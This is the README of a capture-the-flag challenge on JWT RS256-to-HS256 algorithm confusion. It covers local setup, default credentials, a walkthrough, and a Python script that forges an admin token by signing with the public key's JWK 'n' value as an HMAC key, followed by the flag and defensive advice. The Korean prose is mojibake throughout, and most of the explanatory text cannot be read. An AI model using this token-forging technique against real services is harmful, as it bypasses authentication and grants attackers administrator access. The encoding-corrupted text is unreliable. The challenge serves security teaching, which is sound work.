# ğŸ” JWT RS256/HS256 Algorithm Confusion CTF

JWT í† í°ì˜ ì•Œê³ ë¦¬ì¦˜ì„ RS256ì—ì„œ HS256ìœ¼ë¡œ ë³€ê²½í•˜ì—¬ ì¸ì¦ì„ ìš°íšŒí•˜ëŠ” CTF ë¬¸ì œì…ë‹ˆë‹¤.

## ğŸ¯ ë¬¸ì œ ëª©í‘œ

admin ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ì„¸ìš”!

## ğŸš€ ì‹¤í–‰ ë°©ë²•

### Docker Compose ì‚¬ìš© (ê¶Œì¥)

```bash
# ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹¤í–‰
docker-compose up --build

# ë¸Œë¼ìš°ì €ì—ì„œ ì ‘ì†
http://localhost:5000
```

### ìˆ˜ë™ ì‹¤í–‰

1. MySQL ì„œë²„ ì‹¤í–‰
2. Python ì˜ì¡´ì„± ì„¤ì¹˜: `pip install -r requirements.txt`
3. Flask ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹¤í–‰: `python app.py`

## ğŸ“‹ ë¬¸ì œ ì„¤ëª…

ì´ ì›¹ì‚¬ì´íŠ¸ëŠ” JWT í† í°ì„ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì¸ì¦ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.

### ì´ˆê¸° ê³„ì • ì •ë³´
- **user**: user123 (ì¼ë°˜ ì‚¬ìš©ì)
- **admin**: admin123 (ê´€ë¦¬ì)

### ì·¨ì•½ì 
ì„œë²„ëŠ” RS256(ë¹„ëŒ€ì¹­í‚¤)ìœ¼ë¡œ JWT í† í°ì„ ìƒì„±í•˜ì§€ë§Œ, ê²€ì¦ ì‹œ JWT í—¤ë”ì˜ `alg` í•„ë“œë¥¼ ì‹ ë¢°í•©ë‹ˆë‹¤. ê³µê²©ìê°€ í—¤ë”ë¥¼ HS256ìœ¼ë¡œ ë³€ê²½í•˜ê³  ëŒ€ì¹­í‚¤ë¡œ ì„œëª…ì„ ìƒì„±í•˜ë©´ ì¸ì¦ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ğŸ¯ ê³µê²© ë°©ë²•

### 1ë‹¨ê³„: ì¼ë°˜ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸
- ì‚¬ìš©ìëª…: `user`, ë¹„ë°€ë²ˆí˜¸: `user123`ìœ¼ë¡œ ë¡œê·¸ì¸
- JWT í† í°ì„ ë°›ìŠµë‹ˆë‹¤

### 2ë‹¨ê³„: JWT í† í° ë¶„ì„
- "í† í° ì •ë³´ ë³´ê¸°" ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ í˜„ì¬ í† í°ì˜ êµ¬ì¡°ë¥¼ í™•ì¸
- Headerì™€ Payloadë¥¼ ë¶„ì„

### 3ë‹¨ê³„: ì•Œê³ ë¦¬ì¦˜ í˜¼ë™ ê³µê²©
JWT í† í°ì„ ë‹¤ìŒê³¼ ê°™ì´ ì¡°ì‘í•©ë‹ˆë‹¤:

1. **Header ìˆ˜ì •**: `{"alg": "HS256", "typ": "JWT"}` (RS256ì—ì„œ HS256ìœ¼ë¡œ ë³€ê²½)
2. **Payload ìˆ˜ì •**: `{"user_id": 1, "username": "admin", "role": "admin"}`
3. **Signature ìƒì„±**: ì„œë²„ì˜ secret_keyë¡œ HMAC-SHA256 ì„œëª… ìƒì„±

### 4ë‹¨ê³„: ê³µê°œí‚¤ íšë“ ë° í† í° ìœ„ì¡°
http://localhost:5000/.well-known/jwks.json ê²½ë¡œì—ì„œ JWT ê³µê°œí‚¤ íšë“
ì•„ë˜ python ì˜ˆì‹œ ì½”ë“œë¡œ JWT í† í° ìœ„ì¡°

```python
# JWT ì•Œê³ ë¦¬ì¦˜ í˜¼ë™ ê³µê²©ìš© í† í° ìƒì„±
import jwt
import datetime
import base64

# ì„œë²„ ê³µê°œí‚¤ì˜ JWK "n" ê°’ì„ base64url ë””ì½”ë”©í•˜ì—¬ HMAC keyë¡œ ì‚¬ìš©
n_b64 = "..."  # jwks.jsonì—ì„œ n ê°’ ë³µì‚¬
rem = len(n_b64) % 4
if rem > 0:
    n_b64 += '=' * (4 - rem)
hmac_key = base64.urlsafe_b64decode(n_b64.encode())

# ê´€ë¦¬ì ê¶Œí•œì´ ìˆëŠ” í˜ì´ë¡œë“œ êµ¬ì„±
payload = {
    "user_id": 1,
    "username": "admin",
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=12)
}

# í—¤ë”ë¥¼ HS256ìœ¼ë¡œ ëª…ì‹œ
headers = {
    "alg": "HS256",
    "typ": "JWT"
}

# HMAC-SHA256ìœ¼ë¡œ ìœ„ì¡°ëœ ì„œëª… ìƒì„±
token = jwt.encode(payload, hmac_key, algorithm="HS256", headers=headers)
print(token)

```

### 5ë‹¨ê³„: Admin ê¶Œí•œ í™•ì¸
"Admin ê¶Œí•œ í™•ì¸" ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“!

## ğŸ† í”Œë˜ê·¸

ì„±ê³µí•˜ë©´ ë‹¤ìŒ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
flag{JwtAlgHs256_problem_is_solved_gooooooood}
```

## ğŸ” í•™ìŠµ í¬ì¸íŠ¸

1. **JWT êµ¬ì¡° ì´í•´**: Header, Payload, Signatureì˜ ì—­í• 
2. **ì•Œê³ ë¦¬ì¦˜ í˜¼ë™ ê³µê²©**: RS256ì—ì„œ HS256ìœ¼ë¡œ ë³€ê²½í•˜ì—¬ ëŒ€ì¹­í‚¤ ê²€ì¦ìœ¼ë¡œ ìš°íšŒ
3. **ë¹„ëŒ€ì¹­í‚¤ vs ëŒ€ì¹­í‚¤**: RSAì™€ HMACì˜ ì°¨ì´ì  ì´í•´
4. **ë³´ì•ˆ ì·¨ì•½ì **: ì„œë²„ ì¸¡ ì•Œê³ ë¦¬ì¦˜ ê²€ì¦ ë¶€ì¡±

## ğŸ›¡ï¸ ë°©ì–´ ë°©ë²•

- ì„œë²„ì—ì„œ JWT í—¤ë”ì˜ `alg` í•„ë“œë¥¼ ì‹ ë¢°í•˜ì§€ ì•Šê¸°
- `algorithms` íŒŒë¼ë¯¸í„°ë¥¼ ëª…ì‹œì ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ í—ˆìš©ëœ ì•Œê³ ë¦¬ì¦˜ë§Œ ì‚¬ìš©
- í† í° ê²€ì¦ ì‹œ ì•Œê³ ë¦¬ì¦˜ì„ ê°•ì œë¡œ ì§€ì •
- ê³µê°œí‚¤ì™€ ëŒ€ì¹­í‚¤ë¥¼ ëª…í™•íˆ êµ¬ë¶„í•˜ì—¬ ì‚¬ìš©

## ğŸ“ ì°¸ê³  ìë£Œ

- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/) 